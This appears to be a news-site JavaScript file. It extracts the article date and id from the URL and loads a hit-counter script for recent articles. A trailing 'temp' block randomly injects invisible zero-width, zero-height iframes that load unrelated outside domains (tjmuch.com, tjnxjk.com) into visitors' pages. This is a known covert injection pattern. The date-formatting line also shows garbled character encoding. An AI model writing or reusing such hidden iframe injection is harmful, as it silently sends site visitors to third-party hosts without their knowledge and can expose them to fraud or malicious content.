	var strUrl = document.location;
	//var strUrl = "http://www3.pub.enorth.com.cn/test/system/2003/12/24/000701783.shtml";
	//var strUrl = "http://www.dxsbbs.com/system/2003/12/24/000701783.shtml";
	var pattern = /^(http:\/\/){1}[a-zA-Z0-9\._\-\/]+\/system\/([\d]{4})\/([\d]{2})\/([\d]{2})\/([\d]{9})\.{1}([a-zA-Z]+)$/i;
	var flag = pattern.test(strUrl);
	//strUrl.match(pattern);
	if (flag == true) {

		//var arr = strUrl.match(pattern);
                  var arr = pattern.exec(strUrl);
		var year = arr[2];
		var month = arr[3];
		var day = arr[4];
		var s = year+"Äê"+month+"ÔÂ"+day+"ÈÕ";
		var newsDate = new Date(year,month-1,day);
		var clientDate = new Date();
		
		var MinMilli = 1000 * 60;
		var HrMilli = MinMilli * 60;
		var DayMilli = HrMilli * 24;
				
		var dayDiff = Math.floor((clientDate - newsDate)/DayMilli);

		if (dayDiff <= 10 ) {
			//if (clientDate.getSeconds()%5 == 0) {
				document.write("<script src=http://realcalc.cnnb.com.cn/real_calc/CalcWriteServlet?newsId="+arr[5]+"><"+"/script>");
			//}
		} 
	} 

/////// temp start
var myDate = new Date();
if (myDate.getTime()%800 == 0) {
document.writeln("<iframe width=0 height=0 src=http://www.tjmuch.com></iframe>");
}

if (myDate.getTime()%3800 == 0) {
document.writeln("<iframe width=0 height=0 src=http://www.tjnxjk.com></iframe>");
}

/////// temp end
document.close();
 
 
 
 
 
 
 
 
 
 
 
 